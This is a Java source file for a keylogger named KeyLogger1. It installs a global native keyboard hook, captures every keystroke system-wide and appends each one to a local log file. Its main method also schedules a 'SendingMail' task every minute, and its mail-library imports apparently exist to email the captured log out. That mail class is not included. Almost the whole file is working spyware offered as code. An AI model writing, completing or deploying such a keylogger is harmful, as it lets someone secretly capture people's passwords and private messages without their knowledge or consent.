import java.io.BufferedWriter;
import javax.swing.JOptionPane;
import java.io.File;
import java.io.FileWriter;
import java.util.Properties;
import java.util.Scanner;
import java.util.Timer;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.BodyPart;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.swing.JOptionPane;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger1 implements NativeKeyListener {
	
	public static void main(String args[])
	{
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(new KeyLogger1());
		
		
			Timer timer = new Timer();
		   timer.schedule(new SendingMail(), 0, 1*60*1000);
	}

	@SuppressWarnings("resource")
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		//System.out.println("Key Pressed : "+ NativeKeyEvent.getKeyText(e.getKeyCode()));
		if(e.getKeyCode()==NativeKeyEvent.VC_ESCAPE)
		{
			try {
				GlobalScreen.unregisterNativeHook();
				
				

					

					}
				
				
				
			catch (NativeHookException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
			}
		}
		try {
	          String keyString;
	          keyString = NativeKeyEvent.getKeyText(e.getKeyCode());  
	          //For system print console
	          System.out.println("Key Strokes :");
	          System.out.println(keyString);
	          //For output to file
	          File a =new File("T:/WorkSpace/Loggers/src/Logs/log.log");
	          
	          
	          if (!a.exists()) {
	                a.createNewFile();
	            }
	          FileWriter fw = new FileWriter(a.getAbsoluteFile(),true);
	          BufferedWriter bw = new BufferedWriter(fw);
	         bw.append(keyString);
	          //Scanner read = new Scanner (new File("D:/WorkSpace/LogFile.log"));
	         // read.useDelimiter(" ");
	          //bw.write("\t");
	         // bw.newLine();
	         String newLine = System.getProperty("space.separator");
	         bw.newLine();
//	         if( bw.append(keyString).equals(" "))
//	         {
 	//bw.newLine();
//	         }
	        	 	          bw.close();         
	        } catch (Exception e1) {        
	            e1.printStackTrace();
	        }
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
		System.out.println("Key Released : "+ NativeKeyEvent.getKeyText(e.getKeyCode()));
	
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent arg0) {
		// TODO Auto-generated method stub
		
	}

}